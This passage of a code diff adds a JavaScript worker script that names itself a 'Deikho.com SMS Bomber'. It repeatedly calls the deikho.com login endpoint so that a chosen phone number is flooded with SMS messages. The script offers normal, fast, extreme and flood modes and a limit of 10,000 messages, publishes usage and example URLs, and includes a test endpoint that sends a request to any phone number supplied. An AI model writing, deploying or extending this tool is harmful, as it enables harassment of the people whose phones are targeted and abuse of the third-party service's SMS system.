+  const actualQuantity = Math.min(attempts, quantity);
+  
+  return {
+    successful: successful,
+    failed: actualQuantity - successful,
+    details: [{
+      mode: 'flood',
+      duration: `${Date.now() - startTime}ms`,
+      total_attempts: attempts,
+      successful: successful,
+      failed: attempts - successful,
+      requests_per_second: (attempts / ((Date.now() - startTime) / 1000)).toFixed(2)
+    }]
+  };
+}
+
+// Health check with deikho.com test
+async function healthCheck() {
+  try {
+    const testPhone = '923001234567'; // Test number
+    const DEIKHO_API = `https://deikho.com/login?phone=${testPhone}`;
+    
+    const response = await fetch(DEIKHO_API, {
+      headers: {
+        'User-Agent': 'Health-Check/1.0'
+      }
+    });
+    
+    return {
+      deikho_api: 'online',
+      status_code: response.status,
+      response_time: 'tested'
+    };
+  } catch (error) {
+    return {
+      deikho_api: 'offline',
+      error: error.message
+    };
+  }
+}
+
+// Additional endpoint for API info
+addEventListener('fetch', event => {
+  const url = new URL(event.request.url);
+  
+  // Health check endpoint
+  if (url.pathname === '/health' || url.pathname === '/status') {
+    event.respondWith(new Response(JSON.stringify({
+      status: 'online',
+      service: 'Deikho.com SMS Bomber',
+      version: '1.0',
+      api_endpoint: 'https://deikho.com/login?phone=',
+      limits: {
+        max_messages: 10000,
+        modes: ['normal', 'fast', 'extreme', 'flood'],
+        supported_countries: ['92', '1', '44', '91']
+      },
+      usage: '/?phone=PHONE&qty=QUANTITY&mode=MODE&country=CODE',
+      example: '/?phone=3012345678&qty=100&mode=fast&country=92',
+      timestamp: new Date().toISOString()
+    }, null, 2), {
+      headers: {
+        'Content-Type': 'application/json',
+        'Access-Control-Allow-Origin': '*'
+      }
+    }));
+  }
+  
+  // Simple test endpoint
+  if (url.pathname === '/test') {
+    const testPhone = url.searchParams.get('phone') || '923001234567';
+    event.respondWith(handleTest(testPhone));
+  }
+});
+
+async function handleTest(phone) {
+  try {
+    const DEIKHO_API = `https://deikho.com/login?phone=${phone}`;
+    const response = await fetch(DEIKHO_API);
+    
+    return new Response(JSON.stringify({
+      test: 'success',
+      phone: phone,
+      api: 'deikho.com',
+      status: response.status,
+      working: response.ok
+    }, null, 2), {
+      headers: {
+        'Content-Type': 'application/json',
+        'Access-Control-Allow-Origin': '*'
+      }
+    });
+  } catch (error) {
+    return new Response(JSON.stringify({
+      test: 'failed',
+      error: error.message
+    }, null, 2), {
+      status: 500,
+      headers: { 'Content-Type': 'application/json' }
+    });
+  }
+        }
